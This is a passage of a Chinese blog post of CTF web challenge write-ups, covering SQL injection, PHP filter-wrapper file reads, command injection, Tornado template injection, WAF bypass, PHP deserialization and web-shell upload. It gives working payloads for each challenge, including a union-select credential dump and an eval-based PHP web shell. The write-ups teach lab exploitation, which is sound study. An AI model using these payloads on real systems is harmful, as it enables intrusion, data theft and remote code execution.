+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_GET[&#39;query&#39;] || flag from flag</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode<br>模式：pipes_as_concat 来实现oracle 的一些功能</p>
+</blockquote>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
+
+<p>非预期解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1 </span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>不截图了，进入靶机只有一个<strong>tips</strong>等着被点。跳转以后看url中参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+
+<p>页面内容只有</p>
+<blockquote>
+<p>Can you find out the flag?</p>
+</blockquote>
+<p>立马想到使用php伪协议读文件内容。使用filter过滤器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OTAyNTIyNDgtMjY3NC00NDdjLWFlYWMtYjc3ZTc5YjYwMzVmfQo&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>解密得到flag</p>
+<hr>
+<h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103724.png"></p>
+<p>查看源码，又一个背景是黑色的超链接跳转到 Archive_room.php。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103842.png"></p>
+<p>查看源码SECRET跳转的是action.php。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120103907.png"></p>
+<p>但是跳转以后是url地址为end.php，所以中间跳过了一个页面，使用bp抓包查看。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104246.png"></p>
+<p>stristr()函数返回字符串中子串第一次出现位置之后的内容，简而言之还是过滤。</p>
+<p>同样使用php伪协议filter过滤器读取文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZmZjZTAwNWYtYjEyOS00YWM1LTg3MzYtZDM3YzUwYjYxNjZkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>解密得到网页源码，flag在其中。</p>
+<hr>
+<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>顶端の告诫：用 sqlmap 是没有灵魂的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120104703.png"></p>
+<p>尝试万能密码（其实没卵用）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;or 1&#x3D;1 #</span><br><span class="line">任意密码</span><br></pre></td></tr></table></figure>
+
+<p>这道题是常规的sql注入，测注入点、查字段数、爆库、爆字段值、爆表。组合拳</p>
+<p>字段数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 3 #</span><br></pre></td></tr></table></figure>
+<p>爆库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line"></span><br><span class="line">geekuser,l0ve1ysq1</span><br></pre></td></tr></table></figure>
+<p>爆字段值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;l0ve1ysq1&#39; #</span><br><span class="line"></span><br><span class="line">id,username,password</span><br></pre></td></tr></table></figure>
+
+<p>爆表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #</span><br><span class="line"></span><br><span class="line">&#39;1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag&#123;c4e8849c-e0e3-4e0d-b701-26a5abeec46a&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="2021-01-21"><a href="#2021-01-21" class="headerlink" title="2021.01.21"></a>2021.01.21</h1><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p><a href="https://braindance.tk/2020/%5BGXYCTF2019%5DPing%20Ping%20Ping/">传送门</a></p>
+<hr>
+<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121090002.png"></p>
+<p>肯定是尝试管道符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat &#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>打开页面三个超链接</p>
+<blockquote>
+<p>/flag.txt</p>
+<p>/welcome.txt</p>
+<p>hints.txt</p>
+</blockquote>
+<p>内容分别是</p>
+<blockquote>
+<p>flag in /fllllllllllllag</p>
+<p>render</p>
+<p>md5(cookie_secret+md5(filename))</p>
+</blockquote>
+<p>进入hints.txt注意到url地址此时为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;2a84a09bc1d5e3d8745131754ff208fa</span><br></pre></td></tr></table></figure>
+
+<p>再根据hints.txt文件的内容，推断可以使用url方式访问文件，但是需要提供<strong>filehash</strong>值，加密的方法即hints.txt的内容：md5(cookie_secret+md5(filename))。flag文件的名称<code>filename</code>有了，接下来就是获取<code>cookie_secret</code>的值。</p>
+<p>接下来触及到盲区了，获取cookie_secret是看wp。</p>
+<blockquote>
+<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p>
+</blockquote>
+<blockquote>
+<p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p>
+</blockquote>
+<p>获取cookie_secret的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121091616.png"></p>
+<p>获得cookie_secret的值为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eb326d39-cd67-47bd-b2d3-71125996417b</span><br></pre></td></tr></table></figure>
+
+<p>根据hints.txt的url验证一下是如何加密的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092122.png"></p>
+<p>选中的蓝色部分是<code>/hints.txt</code>加密后的md5值。推断出filehash格式以后直接访问flag文件，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;2a84a09bc1d5e3d8745131754ff208fa</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092431.png"></p>
+<p>一句话直接连。</p>
+<hr>
+<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092956.png"></p>
+<p>一个计算器随便试一试，当输入字母时会报错。查看网页源码，在script中发现了运行计算器的php文件：<strong>calc.php</strong>，但是也有一句很重要的注释</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--I&#39;ve set up WAF to ensure security.--&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121093233.png"></p>
+<p>php的正则表达式中并没有过滤字母的条件，所以我们输入字母被过滤是因为<strong>WAF</strong>，接下来是参考网上的wp自己的理解</p>
+<p>可以在calc.php传参</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num&#x3D;a</span><br></pre></td></tr></table></figure>
+
+<p>php会输出一个值a，说明已经绕过了WAF。这里使用的是WAF和php解析方法不一样，WAF解析到空格’ ‘会直接过滤掉，这样WAF认为传入的就是一个空值，并不会识别num，但是php解析的时候会把空格去掉，这样就能get到num的值。</p>
+<p>接下来绕过正则就可以使用char()的方式使用ascii码转。空格被过滤但是想使用php输出可以使用var_dump()</p>
+<p>查看根目录下文件，可以使用scandir（）遍历文件夹，其中char（47）——&gt;   ‘/‘  ：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num&#x3D;1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
+
+<p>找到了疑似flag文件：f1agg，使用file_get_contents（）读取文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png"></p>
+<p>查看源码在”氛围”这两个字上有隐藏的跳转Secret.php。进入以后页面显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">It doesn&#39;t come from &#39;https:&#x2F;&#x2F;www.Sycsecret.com&#39;</span><br></pre></td></tr></table></figure>
+
+<p>提示页面不是来自这个网址，所以在HackBar上加上Referer。之后又提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please use &quot;Syclover&quot; browser</span><br></pre></td></tr></table></figure>
+
+<p>加上User-Agent。提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No!!! you can only read this locally!!!</span><br></pre></td></tr></table></figure>
+
+<p>加上X-Forwarded-For。<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/http-x-forwarded-for.html">HTTP X-Forwarded-For 介绍</a></p>
+<p>最终的请求头：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;Secret.php HTTP&#x2F;1.1</span><br><span class="line">Host: node3.buuoj.cn:26715</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">x-forwarded-for: 127.0.0.1</span><br><span class="line">referer: https:&#x2F;&#x2F;www.Sycsecret.com</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121105104.png"></p>
+<p>源码备份在<code>www.zip</code>中。下载以后有五个文件</p>
+<blockquote>
+<p>class.php</p>
+<p>flag.php</p>
+<p>index.js</p>
+<p>index.php</p>
+<p>style.css</p>
+</blockquote>
+<p>在index.php中有一段代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#39;class.php&#39;;</span><br><span class="line">    $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>再结合又一个class.php，所以这道题考点应该是反序列化。</p>
+<p>class.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>获取flag的代码位置是30-32行。分析这个Name对象，创建对象时可以为对象赋值，对象销毁时会判断password值是否是100，且username值是否为admin，如果两者都成立输出flag，但是__wakeup（）会在反序列化时调用将username值置为guest，所以需要反序列化逃逸。</p>
+<p>我使用的构造对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D;&#39;admin&#39;;</span><br><span class="line">    private $password &#x3D;&#39;100&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new Name;</span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化逃逸，使对象属性的数量大于原来的值，就可以绕过wakeup函数。最终payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121111429.png"></p>
+<p>先尝试上传一个gif图片马内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;a&#39;]);</span><br></pre></td></tr></table></figure>
+
+<p>页面提示过滤：</p>
+<blockquote>
+<p> NO! HACKER! your file included ‘&lt;?’</p>
+</blockquote>
+<p>尝试script执行php代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以上传，文件在/upload目录下。尝试修改后缀上传，phtml上传成功，可以执行php和script代码，使用蚁剑连接。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121112135.png"></p>
+<hr>
+</div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120223242.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/Mwechat.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/Mwechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/Malipay.png" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/Malipay.png" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120232544.png" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【极客大挑战 2019】RCE ME</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/Hackgame20201/" title="Hackgame2020(一)"><img class="cover" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120831.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-01</div><div class="title">Hackgame2020(一)</div></div></a></div><div><a href="/2020/[GXYCTF2019]Ping Ping Ping/" title="【GXYCTF2019】Ping Ping Ping"><img class="cover" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120223448.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-12-04</div><div class="title">【GXYCTF2019】Ping Ping Ping</div></div></a></div><div><a href="/2020/[极客大挑战 2019]RCE ME/" title="【极客大挑战 2019】RCE ME"><img class="cover" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120232544.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-12-05</div><div class="title">【极客大挑战 2019】RCE ME</div></div></a></div><div><a href="/2020/DMCTF之Web/" title="DMCTF之Web"><img class="cover" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120232346.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-29</div><div class="title">DMCTF之Web</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div class="comment-switch"><span class="first-comment">Valine</span><label><input id="switch-comments-btn" type="checkbox"/><span class="slider"></span></label><span class="second-comment">Disqusjs</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Braindance</div><div class="framework-info"><span>框架 </span><a href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">兴趣使然</div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/js/utils.js"></script><script src="https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const initData = {
+      el: '#vcomment',
+      appId: 'shaenDlkzwy9NvdCNJVrJspu-MdYXbMMI',
+      appKey: 'e074xMKoSw3B9kWmBediaBE9',
+      placeholder: 'Just Go Go.(偷偷说下，昵称输入自己QQ号会自动获取头像和昵称)',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/',
